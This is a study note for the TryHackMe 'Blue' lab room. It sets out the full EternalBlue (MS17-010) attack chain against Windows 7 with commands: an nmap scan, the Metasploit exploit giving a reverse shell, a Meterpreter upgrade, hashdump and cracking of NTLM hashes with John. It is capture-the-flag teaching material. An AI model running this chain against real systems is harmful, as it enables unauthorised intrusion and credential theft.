---
tags: [THM, cyber-security-101, exploitation, EternalBlue, CTF, room]
platform: TryHackMe
type: room
module: "07 - Exploitation Basics"
module_number: 7
room_number: 29
status: "⬜"
url: https://tryhackme.com/room/blue
difficulty: Easy
---

# 🔵 Blue

> [!abstract] Summary
> Hack a Windows 7 machine using EternalBlue (MS17-010). Full attack chain: recon → exploit → SYSTEM → credential dump → crack. One of the most iconic THM rooms.

**Path:** [[Cyber Security 101]] > Module 7 > Blue

## 🎯 Learning Objectives
- Exploit EternalBlue using Metasploit
- Escalate to SYSTEM
- Dump and crack NTLM hashes
- Complete a full Windows exploitation chain

## 📖 Key Concepts

### EternalBlue (MS17-010)
- **Type:** SMB buffer overflow → unauthenticated RCE
- **Affected:** Windows XP/Vista/7/8, Server 2003–2012 (unpatched)
- **Leaked:** April 2017 by Shadow Brokers (NSA tool)
- **Used by:** WannaCry, NotPetya, countless ransomware families

> [!warning] **WannaCry (2017)** infected 200,000+ computers across 150 countries in a single day using EternalBlue. The patch (MS17-010) was available 2 months before the outbreak. Patch management saves lives.

### Full Attack Chain

#### 1. Recon
```bash
nmap -sV --script=smb-vuln-ms17-010 10.10.x.x
# Look for: VULNERABLE
```

#### 2. Exploit
```bash
msfconsole
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 10.10.x.x
set LHOST 10.10.14.x
exploit
```

#### 3. Upgrade Shell → Meterpreter
```bash
use post/multi/manage/shell_to_meterpreter
set SESSION 1 && run
```

#### 4. Verify SYSTEM
```bash
getuid    # NT AUTHORITY\SYSTEM
```

#### 5. Credential Dump + Crack
```bash
hashdump
# Administrator:500:aad3...:NTLM_HASH:::
john --format=NT --wordlist=rockyou.txt ntlm.txt
```

## 🔑 Key Takeaways
- EternalBlue = unauthenticated SYSTEM — no credentials needed
- The exploit is nearly 8 years old — unpatched systems still exist in the wild
- Full chain: Nmap → Metasploit → Meterpreter → hashdump → John
- Teaches the complete Windows exploitation workflow

## 🔗 Related Notes
- [[CS101-27 - Metasploit Exploitation]] · [[CS101-28 - Metasploit Meterpreter]]
- [[EternalBlue]] · [[MS17-010]] · [[WannaCry]] · [[SMB]] · [[Privilege Escalation]]
